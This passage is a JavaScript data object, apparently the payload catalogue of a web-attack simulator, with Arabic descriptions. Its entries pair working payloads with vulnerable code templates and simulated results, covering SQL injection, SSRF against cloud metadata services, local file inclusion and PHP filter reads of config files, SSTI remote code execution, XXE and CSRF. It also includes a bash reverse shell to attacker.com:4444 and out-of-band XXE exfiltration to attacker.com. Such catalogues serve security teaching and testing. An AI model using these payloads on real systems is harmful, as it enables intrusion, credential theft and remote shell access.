        code: "\" UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -",
        breakout: "\" UNION",
        template: "SELECT id, name FROM items WHERE code = \"[USER_INPUT]\";",
        simulatedType: "db_table",
        simulatedVal: "[ {column_name: 'user_id'}, {column_name: 'email_address'}, {column_name: 'password_hash'} ]",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Double Quote Context"],
        pipeline: [
          { title: "Column Enumeration", desc: "Columns enumerated." }
        ],
        desc: "يستخرج أسماء الأعمدة بعد كسر علامة التنصيص."
      },
      string_sq: {
        code: "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -",
        breakout: "' UNION",
        template: "SELECT id, name FROM items WHERE code = '[USER_INPUT]';",
        simulatedType: "db_table",
        simulatedVal: "[ {column_name: 'user_id'}, {column_name: 'email_address'}, {column_name: 'password_hash'} ]",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Single Quote Context"],
        pipeline: [
          { title: "Column Enumeration", desc: "Columns enumerated." }
        ],
        desc: "يستخرج أسماء الأعمدة لجدول محدد."
      }
    },
    error_extract: {
      int: {
        code: "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))",
        breakout: "AND",
        template: "SELECT * FROM logs WHERE log_id = [USER_INPUT];",
        simulatedType: "db_error",
        simulatedVal: "SQL Syntax Error: XPATH syntax error: '~8.0.32-MySQL~'",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-209 & CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Database error messages enabled in HTTP response"],
        pipeline: [
          { title: "Malformed Query", desc: "EXTRACTVALUE called with invalid XPATH." },
          { title: "Error Generation", desc: "Database engine throws XPATH error." },
          { title: "Data Leak", desc: "Subquery result evaluated inside error message." }
        ],
        desc: "استخراج البيانات عبر الأخطاء (Error-Based). يتعمد إرسال كود XML خاطئ ليقوم السيرفر بإظهار رسالة خطأ تحتوي على إصدار قاعدة البيانات (@@version)."
      },
      string_dq: {
        code: "\" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -",
        breakout: "\" AND",
        template: "SELECT * FROM logs WHERE log_type = \"[USER_INPUT]\";",
        simulatedType: "db_error",
        simulatedVal: "SQL Syntax Error: XPATH syntax error: '~8.0.32-MySQL~'",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-209",
        capec: "CAPEC-66",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Error messages enabled"],
        pipeline: [
          { title: "Error Trigger", desc: "Data leaked." }
        ],
        desc: "يكسر علامة التنصيص المزدوجة ويجبر قاعدة البيانات على إظهار رسالة خطأ تسرب البيانات."
      },
      string_sq: {
        code: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -",
        breakout: "' AND",
        template: "SELECT * FROM logs WHERE log_type = '[USER_INPUT]';",
        simulatedType: "db_error",
        simulatedVal: "SQL Syntax Error: XPATH syntax error: '~8.0.32-MySQL~'",
        owasp: "A03:2021 - SQL Injection",
        cwe: "CWE-209",
        capec: "CAPEC-66",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Error messages enabled"],
        pipeline: [
          { title: "Error Trigger", desc: "Data leaked." }
        ],
        desc: "يكسر علامة التنصيص المفردة ويستخرج البيانات عبر رسالة الخطأ."
      }
    },
    time_delay: {
      int: {
        code: "1; WAITFOR DELAY '0:0:5'--",
        breakout: ";",
        template: "SELECT * FROM users WHERE id = [USER_INPUT];",
        simulatedType: "time",
        simulatedVal: "HTTP/1.1 200 OK (Response time: 5,042 ms)",
        owasp: "A03:2021 - Blind SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Blind SQL Injection context", "Database supports stacked queries or delay functions"],
        pipeline: [
          { title: "Command Injection", desc: "WAITFOR DELAY injected." },
          { title: "Thread Sleep", desc: "DB worker thread sleeps for 5 seconds." },
          { title: "Time Inference", desc: "Attacker observes delayed HTTP response." }
        ],
        desc: "كود مخصص لقواعد بيانات SQL Server. يجبر السيرفر على التوقف (Sleep) لمدة 5 ثوانٍ لتأكيد وجود ثغرة حقن عمياء (Blind SQLi)."
      },
      string_dq: {
        code: "\"; WAITFOR DELAY '0:0:5'--",
        breakout: "\";",
        template: "SELECT * FROM users WHERE email = \"[USER_INPUT]\";",
        simulatedType: "time",
        simulatedVal: "HTTP/1.1 200 OK (Response time: 5,042 ms)",
        owasp: "A03:2021 - Blind SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Double Quote Context"],
        pipeline: [
          { title: "Time Delay", desc: "Response delayed." }
        ],
        desc: "يكسر السلسلة المزدوجة ويؤخر استجابة السيرفر."
      },
      string_sq: {
        code: "'; WAITFOR DELAY '0:0:5'--",
        breakout: "';",
        template: "SELECT * FROM users WHERE email = '[USER_INPUT]';",
        simulatedType: "time",
        simulatedVal: "HTTP/1.1 200 OK (Response time: 5,042 ms)",
        owasp: "A03:2021 - Blind SQL Injection",
        cwe: "CWE-89",
        capec: "CAPEC-66",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Single Quote Context"],
        pipeline: [
          { title: "Time Delay", desc: "Response delayed." }
        ],
        desc: "يكسر السلسلة المفردة ويؤخر استجابة السيرفر."
      }
    }
  },
  ssrf: {
    aws_metadata: {
      url_param: {
        code: "http://169.254.169.254/latest/meta-data/",
        breakout: "",
        template: "curl_exec('https://api.internal.com/fetch?target=' + [USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nami-id\ninstance-id\niam/security-credentials/",
        owasp: "A10:2021 - Server-Side Request Forgery",
        cwe: "CWE-918",
        capec: "CAPEC-664",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Cloud Hosted Application (AWS EC2)", "IMDSv1 enabled or unprotected metadata IP"],
        pipeline: [
          { title: "URL Injection", desc: "169.254.169.254 submitted as target URL." },
          { title: "Outbound Request", desc: "Vulnerable server makes backend HTTP request." },
          { title: "IMDS Query", desc: "AWS Link-local metadata service queried." },
          { title: "Credentials Leak", desc: "IAM role credentials returned in response." }
        ],
        desc: "يطلب بشكل مباشر عنوان الـ IP السحري الخاص بخوادم AWS لسحب البيانات الوصفية (Metadata) للسيرفر."
      },
      path_append: {
        code: "@169.254.169.254/latest/meta-data/",
        breakout: "@",
        template: "fetch('https://api.company.com/' + [USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nami-id\ninstance-id\niam/security-credentials/",
        owasp: "A10:2021 - Server-Side Request Forgery",
        cwe: "CWE-918",
        capec: "CAPEC-664",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["URL Parser mishandles @ credentials"],
        pipeline: [
          { title: "URL Parsing Bypass", desc: "@ redirects host resolution." }
        ],
        desc: "يستخدم علامة `@` لخداع المحلل (Parser) واعتبار ما قبلها كاسم مستخدم، فيقوم السيرفر بطلب عنوان AWS الداخلي."
      }
    },
    gcp_metadata: {
      url_param: {
        code: "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        breakout: "",
        template: "file_get_contents([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\nMetadata-Flavor: Google\n\ninstance/attributes/kube-env",
        owasp: "A10:2021 - Server-Side Request Forgery",
        cwe: "CWE-918",
        capec: "CAPEC-664",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Google Cloud Platform Host"],
        pipeline: [
          { title: "GCP Metadata", desc: "Internal DNS resolved." }
        ],
        desc: "يطلب البيانات الوصفية لخوادم Google Cloud (GCP). ملاحظة: يتطلب هذا الهجوم غالباً إضافة ترويسة (Header) خاصة."
      },
      path_append: {
        code: "@metadata.google.internal/computeMetadata/v1/",
        breakout: "@",
        template: "curl('[USER_INPUT]');",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\nMetadata-Flavor: Google\n\ninstance/attributes/kube-env",
        owasp: "A10:2021 - Server-Side Request Forgery",
        cwe: "CWE-918",
        capec: "CAPEC-664",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["URL Parser flaw"],
        pipeline: [
          { title: "GCP Metadata", desc: "Internal DNS resolved." }
        ],
        desc: "يدمج عنوان GCP الداخلي لتخطي فلاتر الروابط."
      }
    },
    localhost_port: {
      url_param: {
        code: "http://127.0.0.1:22",
        breakout: "",
        template: "http_request([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
        owasp: "A10:2021 - Server-Side Request Forgery",
        cwe: "CWE-918",
        capec: "CAPEC-664",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Internal network access"],
        pipeline: [
          { title: "Port Scan", desc: "Probes loopback port 22." }
        ],
        desc: "يطلب البورت 22 (SSH) على الشبكة المحلية للسيرفر نفسه لاكتشاف المنافذ الداخلية المفتوحة."
      },
      path_append: {
        code: "@127.0.0.1:22",
        breakout: "@",
        template: "http_request([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
        owasp: "A10:2021 - Server-Side Request Forgery",
        cwe: "CWE-918",
        capec: "CAPEC-664",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Internal network access"],
        pipeline: [
          { title: "Port Scan", desc: "Probes loopback port 22." }
        ],
        desc: "يستخدم الـ `@` لتوجيه الطلب الداخلي إلى البورت 22 لمعرفة ما إذا كان مفتوحاً."
      }
    },
    ipv6_bypass: {
      url_param: {
        code: "http://[::]:80/",
        breakout: "",
        template: "curl_fetch([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nContent: Internal Admin Panel",
        owasp: "A10:2021 - Server-Side Request Forgery",
        cwe: "CWE-918",
        capec: "CAPEC-664",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["IPv6 stack enabled on host"],
        pipeline: [
          { title: "IPv6 Bypass", desc: "[::] maps to loopback." }
        ],
        desc: "يستخدم صيغة `[::]` وهي تعادل 127.0.0.1 في بروتوكول IPv6. هذه التقنية تتخطى الكثير من الفلاتر التي تحظر 127.0.0.1 فقط."
      },
      path_append: {
        code: "@[::]:80/",
        breakout: "@",
        template: "curl_fetch([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nContent: Internal Admin Panel",
        owasp: "A10:2021 - Server-Side Request Forgery",
        cwe: "CWE-918",
        capec: "CAPEC-664",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["IPv6 enabled"],
        pipeline: [
          { title: "IPv6 Bypass", desc: "[::] maps to loopback." }
        ],
        desc: "يدمج عنوان IPv6 المحلي لتخطي فلاتر الـ WAF."
      }
    }
  },
  lfi: {
    read_passwd: {
      direct_file: {
        code: "/etc/passwd",
        breakout: "",
        template: "include([USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        owasp: "A01:2021 - Broken Access Control",
        cwe: "CWE-98 & CWE-22",
        capec: "CAPEC-126",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Linux Operating System", "Unsanitized file include parameter"],
        pipeline: [
          { title: "Path Submission", desc: "/etc/passwd submitted." },
          { title: "File Read", desc: "PHP include() reads file from disk." },
          { title: "Response Leak", desc: "User list returned in HTTP body." }
        ],
        desc: "مسار مباشر (Absolute Path) لقراءة ملف كلمات المرور والمستخدمين في أنظمة Linux."
      },
      path_traversal: {
        code: "../../../../../../../../../etc/passwd",
        breakout: "../",
        template: "include('/var/www/html/languages/' . [USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        owasp: "A01:2021 - Broken Access Control",
        cwe: "CWE-22 (Path Traversal)",
        capec: "CAPEC-126",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Directory Traversal vulnerability"],
        pipeline: [
          { title: "Directory Traversal", desc: "../ steps up to root." },
          { title: "File Access", desc: "/etc/passwd reached." }
        ],
        desc: "يستخدم الكثير من `../` للرجوع للخلف والوصول إلى المجلد الرئيسي (Root) ثم الدخول لملف passwd (تخطي المسار)."
      }
    },
    read_win_ini: {
      direct_file: {
        code: "C:\\Windows\\win.ini",
        breakout: "",
        template: "include([USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]",
        owasp: "A01:2021 - Broken Access Control",
        cwe: "CWE-22",
        capec: "CAPEC-126",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Windows OS"],
        pipeline: [
          { title: "Windows Path", desc: "win.ini read." }
        ],
        desc: "مسار مباشر لقراءة ملفات نظام Windows الداخلية."
      },
      path_traversal: {
        code: "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
        breakout: "..\\",
        template: "include('C:\\App\\Public\\' . [USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]",
        owasp: "A01:2021 - Broken Access Control",
        cwe: "CWE-22",
        capec: "CAPEC-126",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Windows OS"],
        pipeline: [
          { title: "Windows Traversal", desc: "win.ini read." }
        ],
        desc: "تخطي المسار في أنظمة Windows باستخدام الشرطة المائلة العكسية."
      }
    },
    php_wrapper: {
      direct_file: {
        code: "php://filter/convert.base64-encode/resource=index.php",
        breakout: "php://",
        template: "include([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "PD9waHAgZWNobyAiSGVsbG8gV29ybGQiOyA/Pg== (Base64 Encrypted PHP Source Code)",
        owasp: "A01:2021 - Broken Access Control",
        cwe: "CWE-98",
        capec: "CAPEC-126",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["PHP backend engine"],
        pipeline: [
          { title: "Wrapper Stream", desc: "php://filter stream opened." },
          { title: "Base64 Encoder", desc: "Stream encoder turns PHP source into Base64 string." },
          { title: "Execution Prevention", desc: "PHP engine outputs Base64 instead of executing PHP tags." }
        ],
        desc: "يستخدم فلاتر PHP لقراءة الكود المصدري للملف (index.php) وتحويله إلى Base64 بدلاً من تنفيذه، مما يسمح للمخترق بقراءة كود الموقع السري!"
      },
      path_traversal: {
        code: "php://filter/convert.base64-encode/resource=../../../../config.php",
        breakout: "php://",
        template: "include('templates/' . [USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "PD9waHAgJGRiX3Bhc3MgPSAiU3VwZXJTZWNyZXQxMjMiOyA/Pg== (Decodes to DB Passwords)",
        owasp: "A01:2021 - Broken Access Control",
        cwe: "CWE-98",
        capec: "CAPEC-126",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["PHP backend engine"],
        pipeline: [
          { title: "Traversal Stream", desc: "Config file read in Base64." }
        ],
        desc: "يدمج تخطي المسارات `../` مع فلاتر PHP لقراءة ملفات الإعدادات (التي تحتوي على كلمات مرور قاعدة البيانات) دون تفعيلها."
      }
    }
  },
  cmdi: {
    rev_shell: {
      direct: {
        code: "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        breakout: "",
        template: "system([USER_INPUT]);",
        simulatedType: "terminal",
        simulatedVal: "$ nc -lvnp 4444\nConnection received on 192.168.1.55:51204\nbash-5.1$ whoami\nwww-data",
        owasp: "A03:2021 - Command Injection",
        cwe: "CWE-78",
        capec: "CAPEC-88",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Unsanitized system shell call", "Outbound TCP connections permitted"],
        pipeline: [
          { title: "Shell Spawn", desc: "system() spawns /bin/sh." },
          { title: "Bash Exec", desc: "Interactive bash redirect initiated." },
          { title: "TCP Handshake", desc: "Outbound socket created to attacker.com:4444." },
          { title: "Shell Access", desc: "Interactive shell granted." }
        ],
        desc: "ينشئ اتصالاً عكسياً (Reverse Shell) بسيرفر المخترق. يتطلب هذا تشغيل أداة تنصت (Listener) على سيرفر المخترق."
      },
      blind: {
        code: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1 |",
        breakout: ";",
        template: "system('ping -c 1 ' . [USER_INPUT]);",
        simulatedType: "terminal",
        simulatedVal: "$ nc -lvnp 4444\nConnection received on 192.168.1.55:51204\nbash-5.1$ id\nuid=33(www-data) gid=33(www-data)",
        owasp: "A03:2021 - Command Injection",
        cwe: "CWE-78",
        capec: "CAPEC-88",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Shell command concatenation allowed"],
        pipeline: [
          { title: "Command Chaining", desc: "; separates commands." }
        ],
        desc: "يكسر الأمر الحالي باستخدام فارزة منقوطة `;` أو `|` لتنفيذ اتصال عكسي مخفي."
      }
    },
    read_file: {
      direct: {
        code: "cat /etc/passwd",
        breakout: "",
        template: "exec([USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/bin/false",
        owasp: "A03:2021 - Command Injection",
        cwe: "CWE-78",
        capec: "CAPEC-88",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Shell execution function"],
        pipeline: [
          { title: "File Output", desc: "cat command executed." }
        ],
        desc: "ينفذ أمر قراءة الملفات مباشرة لسرقة البيانات."
      },
      blind: {
        code: "; cat /etc/passwd #",
        breakout: ";",
        template: "shell_exec('nslookup ' . [USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/bin/false",
        owasp: "A03:2021 - Command Injection",
        cwe: "CWE-78",
        capec: "CAPEC-88",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Shell execution function"],
        pipeline: [
          { title: "Command Chaining", desc: "; separates commands." }
        ],
        desc: "يكسر الأمر الأول، وينفذ أمر القراءة، ثم يعطل (Comment) باقي الأوامر باستخدام `#` لتجنب الأخطاء البرمجية."
      }
    },
    ping_delay: {
      direct: {
        code: "ping -c 10 127.0.0.1",
        breakout: "",
        template: "passthru([USER_INPUT]);",
        simulatedType: "time",
        simulatedVal: "Command executed. Execution time: 10.012 seconds.",
        owasp: "A03:2021 - Command Injection",
        cwe: "CWE-78",
        capec: "CAPEC-88",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Blind RCE context"],
        pipeline: [
          { title: "Time Delay", desc: "Ping sleeps 10 seconds." }
        ],
        desc: "يرسل 10 طلبات Ping للسيرفر نفسه، مما يسبب تأخيراً زمنياً (حوالي 10 ثوانٍ) كدليل لإثبات وجود ثغرة RCE عمياء."
      },
      blind: {
        code: "| ping -c 10 127.0.0.1 |",
        breakout: "|",
        template: "system('traceroute ' . [USER_INPUT]);",
        simulatedType: "time",
        simulatedVal: "Command executed. Execution time: 10.012 seconds.",
        owasp: "A03:2021 - Command Injection",
        cwe: "CWE-78",
        capec: "CAPEC-88",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Blind RCE context"],
        pipeline: [
          { title: "Time Delay", desc: "Ping sleeps 10 seconds." }
        ],
        desc: "يدمج أمر الـ ping لتأخير استجابة السيرفر وإثبات إمكانية تنفيذ الأوامر بالخفاء."
      }
    }
  },
  ssti: {
    math: {
      jinja2: {
        code: "{{7*7}}",
        breakout: "{{",
        template: "render_template_string('Hello ' + [USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nHello 49",
        owasp: "A03:2021 - Template Injection",
        cwe: "CWE-1336",
        capec: "CAPEC-242",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Python Flask/Jinja2 engine"],
        pipeline: [
          { title: "Template Engine", desc: "Jinja2 compiles math." }
        ],
        desc: "استغلال بيئة قوالب Jinja2/Twig. إذا طبع السيرفر الرقم 49 بدلاً من الكود، فهذا يعني وجود ثغرة SSTI أكيدة."
      },
      erb: {
        code: "<%= 7*7 %>",
        breakout: "<%=",
        template: "ERB.new('Welcome ' + [USER_INPUT]).result",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nWelcome 49",
        owasp: "A03:2021 - Template Injection",
        cwe: "CWE-1336",
        capec: "CAPEC-242",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Ruby ERB engine"],
        pipeline: [
          { title: "Template Engine", desc: "ERB compiles math." }
        ],
        desc: "كود رياضي لإثبات وجود ثغرة حقن قوالب في بيئة Ruby ERB."
      }
    },
    rce: {
      jinja2: {
        code: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        breakout: "{{",
        template: "render_template_string('User Bio: ' + [USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nUser Bio: uid=1000(flask) gid=1000(flask) groups=1000(flask)",
        owasp: "A03:2021 - Template Injection",
        cwe: "CWE-1336 & CWE-94",
        capec: "CAPEC-242",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Jinja2 template string format"],
        pipeline: [
          { title: "Global Traversal", desc: "__globals__ reached." },
          { title: "OS Import", desc: "os.popen() executed." }
        ],
        desc: "كود هروب (Sandbox Escape) معقد في بيئة Python Jinja2. يتنقل عبر الكائنات الأساسية للغة للوصول إلى مكتبة `os` وتنفيذ أوامر النظام (RCE)."
      },
      erb: {
        code: "<%= system('id') %>",
        breakout: "<%=",
        template: "ERB.new([USER_INPUT]).result",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nuid=1000(rails) gid=1000(rails)",
        owasp: "A03:2021 - Template Injection",
        cwe: "CWE-1336 & CWE-94",
        capec: "CAPEC-242",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Ruby ERB engine"],
        pipeline: [
          { title: "System Exec", desc: "Ruby system() executed." }
        ],
        desc: "ينفذ أوامر النظام مباشرة داخل قوالب Ruby ERB باستخدام دالة `system()`."
      }
    }
  },
  xxe: {
    local_file: {
      classic_xml: {
        code: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
        breakout: "<!ENTITY",
        template: "XMLParser.parse([USER_INPUT]);",
        simulatedType: "xml_res",
        simulatedVal: "<root>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon...</root>",
        owasp: "A05:2021 - Security Misconfiguration",
        cwe: "CWE-611",
        capec: "CAPEC-228",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["External entity resolution enabled in XML parser"],
        pipeline: [
          { title: "DTD Parsing", desc: "<!ENTITY> parsed." },
          { title: "File Resolution", desc: "file:///etc/passwd read." }
        ],
        desc: "يعرّف كياناً خارجياً (External Entity) يشير إلى ملف محلي، ثم يستدعي الكيان داخل الـ XML لإجبار السيرفر على قراءة الملف السري وإرجاعه في الاستجابة."
      },
      soap_body: {
        code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body>&xxe;</soapenv:Body></soapenv:Envelope>",
        breakout: "<!ENTITY",
        template: "SOAPClient.processRequest([USER_INPUT]);",
        simulatedType: "xml_res",
        simulatedVal: "<soapenv:Body>root:x:0:0:root:/root:/bin/bash...</soapenv:Body>",
        owasp: "A05:2021 - Security Misconfiguration",
        cwe: "CWE-611",
        capec: "CAPEC-228",
        stars: "★★★★☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["SOAP Web Services"],
        pipeline: [
          { title: "SOAP XXE", desc: "File resolved in SOAP body." }
        ],
        desc: "نفس الهجوم السابق ولكنه مصمم ليتناسب مع هيكل طلبات الـ SOAP API."
      }
    },
    oob: {
      classic_xml: {
        code: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><data>&send;</data>",
        breakout: "<!ENTITY",
        template: "XMLParser.parse([USER_INPUT]);",
        simulatedType: "network",
        simulatedVal: "GET http://attacker.com/evil.dtd 200 OK\nGET http://attacker.com/log?data=root:x:0:0... 200 OK",
        owasp: "A05:2021 - Security Misconfiguration",
        cwe: "CWE-611",
        capec: "CAPEC-228",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["Outbound network connections permitted"],
        pipeline: [
          { title: "OOB DTD", desc: "Remote DTD fetched." }
        ],
        desc: "استخراج البيانات خارج النطاق (OOB). يجبر السيرفر المستهدف على جلب ملف DTD من سيرفر المخترق، والذي يحتوي على أوامر إضافية لسرقة الملفات وإرسالها سراً للمخترق."
      },
      soap_body: {
        code: "<?xml version=\"1.0\"?><!DOCTYPE soapenv:Envelope [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd;]><soapenv:Envelope><soapenv:Body>&send;</soapenv:Body></soapenv:Envelope>",
        breakout: "<!ENTITY",
        template: "SOAPClient.process([USER_INPUT]);",
        simulatedType: "network",
        simulatedVal: "GET http://attacker.com/evil.dtd 200 OK\nGET http://attacker.com/log?data=root:x:0:0... 200 OK",
        owasp: "A05:2021 - Security Misconfiguration",
        cwe: "CWE-611",
        capec: "CAPEC-228",
        stars: "★★★★★",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["SOAP Web Services"],
        pipeline: [
          { title: "OOB DTD", desc: "Remote DTD fetched." }
        ],
        desc: "استخراج البيانات سراً (OOB) عبر رسائل الـ SOAP API."
      }
    }
  },
  csrf: {
    state_change: {
      html_form: {
        code: "<html>\n  <body onload=\"document.forms[0].submit()\">\n    <form action=\"https://vulnerable.com/change-email\" method=\"POST\">\n      <input type=\"hidden\" name=\"email\" value=\"hacker@evil.com\" />\n    </form>\n  </body>\n</html>",
        breakout: "onload",
        template: "<iframe src=\"https://attacker.com/csrf.html\"></iframe>",
        simulatedType: "http_res",
        simulatedVal: "POST /change-email HTTP/1.1\nCookie: session=xyz123\n\nemail=hacker@evil.com (Status: 200 OK - Email Changed!)",
        owasp: "A01:2021 - Broken Access Control",
        cwe: "CWE-352",
        capec: "CAPEC-62",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: false, edge: true },
        prereqs: ["SameSite cookies set to None or Lax for top-level navigation"],
        pipeline: [
          { title: "Victim Visit", desc: "Victim visits attacker site." },
          { title: "Auto Form Submit", desc: "onload fires form POST." },
          { title: "Cookie Attachment", desc: "Browser attaches session cookies." },
          { title: "State Change", desc: "Email changed." }
        ],
        desc: "صفحة ويب مزورة تحتوي على نموذج (Form) مخفي يرسل نفسه تلقائياً فور فتح الضحية للصفحة."
      },
      ajax_fetch: {
        code: "<script>\n  fetch('https://vulnerable.com/change-email', {\n    method: 'POST',\n    mode: 'cors',\n    credentials: 'include',\n    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },\n    body: 'email=hacker@evil.com'\n  });\n</script>",
        breakout: "credentials",
        template: "<script src=\"https://attacker.com/payload.js\"></script>",
        simulatedType: "http_res",
        simulatedVal: "POST /change-email HTTP/1.1\nCookie: session=xyz123\n\nemail=hacker@evil.com (Status: 200 OK - Email Changed!)",
        owasp: "A01:2021 - Broken Access Control",
        cwe: "CWE-352",
        capec: "CAPEC-62",
        stars: "★★★☆☆",
        browsers: { chrome: true, firefox: true, safari: true, edge: true },
        prereqs: ["CORS misconfiguration or same-origin context"],
        pipeline: [
          { title: "AJAX Exec", desc: "fetch() sends request with credentials." }
        ],
        desc: "هجوم CSRF باستخدام الجافاسكريبت المباشر. استخدام خاصية `credentials: 'include'` يجبر المتصفح على إرسال ملفات الكوكيز."
      }
